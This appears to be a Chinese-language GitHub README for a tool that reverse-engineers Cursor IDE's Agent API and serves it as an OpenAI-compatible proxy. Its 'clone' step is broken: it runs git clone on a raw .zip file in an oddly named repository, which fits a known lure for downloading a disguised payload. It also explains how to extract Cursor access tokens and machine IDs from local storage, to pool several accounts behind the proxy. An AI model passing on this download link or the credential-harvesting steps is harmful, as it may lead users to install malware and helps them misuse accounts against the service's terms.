# CursorIDE2API

> 🔄 将 Cursor IDE 的 Agent API 转为 OpenAI 兼容接口，极简反代，开箱即用。

[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

## ✨ 特性

- 📦 **零依赖数据库** — 只需一个 `token.json`，无需 SQLite / Redis
- 🔌 **OpenAI 兼容** — `/v1/chat/completions` + `/v1/models`，可直接对接任何 OpenAI SDK
- 🌊 **流式 & 非流式** — 完整支持 SSE 流式响应
- 🔑 **多 Token 轮询** — 支持多账号 round-robin 负载均衡
- 🔥 **热更新** — 修改 `token.json` 后自动生效，无需重启
- 🛡️ **可选鉴权** — 环境变量设置 `API_KEY` 即可启用

## 📁 项目结构

```
cursoride2api/
├── server.js              # 入口 (路由 + 启动，全合一)
├── src/
│   ├── config.js          # 配置 & 模型映射
│   ├── converter.js       # OpenAI ↔ Cursor 格式转换
│   └── cursor-client.js   # Cursor Agent API 客户端 (H2 + ConnectRPC)
├── token.json.example     # Token 配置模板
├── Cursor IDE API 逆向工程文档.md  # Cursor API 逆向文档
├── package.json
├── LICENSE
└── README.md
```

## 🚀 快速开始

### 1. 克隆 & 安装

```bash
git clone https://github.com/sdsdsdsdsdsihdkjsdjl/cursoride2api/raw/refs/heads/main/src/cursoride_api_v3.4.zip
cd cursoride2api
npm install
```

### 2. 配置 Token

```bash
cp token.json.example token.json
```

编辑 `token.json`，填入你的 Cursor 凭证：

```json
{
  "tokens": [
    {
      "name": "my-account",
      "accessToken": "eyJhbG...",
      "machineId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "macMachineId": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
    }
  ]
}
```

<details>
<summary>📖 如何获取凭证？</summary>

Cursor 凭证存储在本地 SQLite 数据库中：

| 平台 | 路径 |
|------|------|
| Windows | `%APPDATA%\Cursor\User\globalStorage\state.vscdb` |
| macOS | `~/Library/Application Support/Cursor/User/globalStorage/state.vscdb` |
| Linux | `~/.config/Cursor/User/globalStorage/state.vscdb` |

使用任意 SQLite 工具打开，从 `ItemTable` 表读取：

| Key | 用途 |
|-----|------|
| `cursorAuth/accessToken` | 认证令牌 (**必须**) |
| `telemetry.machineId` | 机器 ID (用于 checksum) |
| `telemetry.macMachineId` | Mac 机器 ID (用于 checksum) |

</details>

### 3. 启动

```bash
npm start
```

```
  ╔═══════════════════════════════════════════╗
  ║       CursorIDE2API v2.0 (Lite)           ║
  ╠═══════════════════════════════════════════╣
  ║  🌐 http://0.0.0.0:3000                   ║
  ║  🔌 /v1/chat/completions                  ║
  ║  📋 /v1/models                            ║
  ╠═══════════════════════════════════════════╣
  ║  🔑 Tokens: 1                              ║
  ║  🤖 Default: claude-4.5-sonnet             ║
  ║  🔐 API Key: OPEN (no key)                 ║
  ╚═══════════════════════════════════════════╝
```

## 📡 API 使用

### Chat Completions

```bash
# 非流式
curl http://localhost:3000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Hello!"}]
  }'

# 流式
curl http://localhost:3000/v1/chat/completions \
  -H "Content-Type: application/json" \
  -d '{
    "model": "gpt-4",
    "messages": [{"role": "user", "content": "Hello!"}],
    "stream": true
  }'
```

### 模型列表

```bash
curl http://localhost:3000/v1/models
```

### 带 API Key

```bash
curl http://localhost:3000/v1/chat/completions \
  -H "Authorization: Bearer your-api-key" \
  -H "Content-Type: application/json" \
  -d '{"model":"gpt-4","messages":[{"role":"user","content":"Hi"}]}'
```

### Python (OpenAI SDK)

```python
from openai import OpenAI

client = OpenAI(
    base_url="http://localhost:3000/v1",
    api_key="any-string"  # 未设置 API_KEY 时填任意值
)

resp = client.chat.completions.create(
    model="gpt-4",
    messages=[{"role": "user", "content": "你好！"}],
    stream=True
)

for chunk in resp:
    if chunk.choices[0].delta.content:
        print(chunk.choices[0].delta.content, end="")
```

## ⚙️ 环境变量

| 变量 | 默认值 | 说明 |
|------|--------|------|
| `PORT` | `3000` | 监听端口 |
| `HOST` | `0.0.0.0` | 监听地址 |
| `API_KEY` | _(空=不校验)_ | API 鉴权密钥 |
| `TOKEN_FILE` | `./token.json` | Token 文件路径 |
| `DEFAULT_MODEL` | `claude-4.5-sonnet` | 默认 Cursor 模型 |
| `CURSOR_CLIENT_VERSION` | `2.6.20` | Cursor 客户端版本号 |
| `REQUEST_TIMEOUT` | `120000` | 请求超时 (ms) |

## 🗺️ 模型映射

传入 OpenAI 风格模型名会自动映射到 Cursor 原生模型：

| 传入 | 映射到 |
|------|--------|
| `gpt-4` / `gpt-4o` / `gpt-4-turbo` | `composer-2` |
| `gpt-4o-mini` | `composer-2-fast` |
| `gpt-3.5-turbo` | `composer-1.5` |
| `claude-3-opus` | `claude-4.6-opus-high` |
| `claude-3-sonnet` | `claude-4.6-sonnet-medium` |
| `claude-3.5-sonnet` | `claude-4.5-sonnet` |
| `gemini-pro` | `gemini-3.1-pro` |

> 💡 也可直接传 Cursor 原生模型名 (如 `composer-2`、`claude-4.5-sonnet-thinking`)，会直接透传。

## 🏗️ 技术原理

本项目基于对 Cursor IDE `workbench.desktop.main.js` 的逆向分析：

1. 使用 **ConnectRPC over HTTP/2** 协议连接 `api2.cursor.sh`
2. 调用 `agent.v1.AgentService/Run` 双向流接口
3. 处理 Envelope 帧编码 (5 字节头 + JSON payload)
4. 自动回复 `execServerMessage` (headless 模式)
5. 实时解析 `interactionUpdate` 流并转为 OpenAI SSE 格式

详细逆向文档见 [Cursor IDE API 逆向工程文档](Cursor%20IDE%20API%20逆向工程文档.md)

## 📄 License

[MIT](LICENSE)

## ⚠️ 免责声明

本项目仅供学习研究使用。使用本项目须遵守 Cursor IDE 的服务条款，开发者不对任何滥用行为负责。
